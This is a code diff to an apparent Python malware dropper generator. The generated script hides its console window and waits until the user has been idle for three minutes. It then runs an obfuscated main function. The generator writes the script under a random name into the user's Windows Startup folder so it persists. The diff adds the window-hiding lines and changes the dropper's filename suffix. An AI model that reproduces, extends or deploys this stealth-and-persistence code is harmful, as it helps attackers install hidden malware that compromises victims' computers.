@@ -98,7 +98,9 @@ class LASTINPUTINFO(Structure):
         ('cbSize', c_uint),
         ('dwTime', c_uint),
     ]
-
+SW_HIDE = 0
+hWnd = windll.kernel32.GetConsoleWindow()
+windll.user32.ShowWindow(hWnd,SW_HIDE)
 def get_idle_duration() -> float:
     lastInputInfo = LASTINPUTINFO()
     lastInputInfo.cbSize = sizeof(lastInputInfo)
@@ -161,6 +163,10 @@ def get_idle_duration() -> float:
     millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
     return millis / 1000.0
 
+SW_HIDE = 0
+hWnd = windll.kernel32.GetConsoleWindow()
+windll.user32.ShowWindow(hWnd,SW_HIDE)
+
 while get_idle_duration() < 180:
         time.sleep(60)
 
@@ -182,7 +188,7 @@ while get_idle_duration() < 180:
         time.sleep(60)
 {obfuscated_main_function}()
     """
-    dropper_py_file = startupFolder.format(os.getlogin(),random_string(is_random=True,is_py=True) + 'w')
+    dropper_py_file = startupFolder.format(os.getlogin(),random_string(is_random=True,is_py=True))
     with open(dropper_py_file, 'w') as dropper_file:
         dropper_file.write(code)
     print(dropper_py_file)
